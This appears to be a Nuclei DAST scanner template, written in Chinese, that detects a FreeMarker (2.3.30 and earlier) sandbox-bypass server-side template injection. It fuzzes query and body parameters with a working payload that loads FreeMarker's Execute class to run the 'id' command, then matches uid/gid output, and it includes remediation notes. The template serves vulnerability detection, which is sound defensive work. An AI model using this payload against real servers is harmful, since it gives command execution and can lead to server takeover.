id: freemarker-sandbox-bypass-ssti

info:
  name: FreeMarker 2.3.30 以下沙箱绕过 SSTI（DAST）
  author: ritikchaddha
  severity: high
  description: |
    FreeMarker 服务端模板注入发生在用户输入被当作模板语法执行时，攻击者可利用模板语言访问运行时对象或调用危险函数。模板注入 FreeMarker 专用表达式，并通过 `id` 输出、`uid/gid` 正则或外带交互确认表达式在服务端执行。
  impact: |
    - 攻击者可能执行系统命令、读取敏感文件、访问应用上下文或窃取环境变量。
    - 模板引擎通常运行在 Web 应用权限下，成功利用可导致应用服务器失陷。
  remediation: |
    - 将用户输入作为普通数据绑定到模板变量，不允许用户控制模板源码或表达式。
    - 升级模板引擎，启用沙箱和最小权限运行环境，禁止危险类、函数和系统命令访问。
  reference:
    - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Java.md#freemarker---sandbox-bypass
  metadata:
    verified: true
  tags: ssti,dast,freemarker,vuln

http:
  - pre-condition:
      - type: dsl
        dsl:
          - 'method == "GET"'
          - 'method == "POST"'
          - 'method == "PUT"'
    payloads:
      injection:
        - "<#assign%20classloader=article.class.protectionDomain.classLoader><#assign%20owc=classloader.loadClass(%22freemarker.template.ObjectWrapper%22)><#assign%20dwf=owc.getField(%22DEFAULT_WRAPPER%22).get(null)><#assign%20ec=classloader.loadClass(%22freemarker.template.utility.Execute%22)>${dwf.newInstance(ec,null)(%22id%22)}"

    fuzzing:
      - parts:
          - query
          - body
        type: replace
        mode: single
        fuzz:
          - "{{injection}}"

    matchers:
      - type: regex
        part: body
        regex:
          - "uid=[0-9]+.*gid=[0-9]+.*"
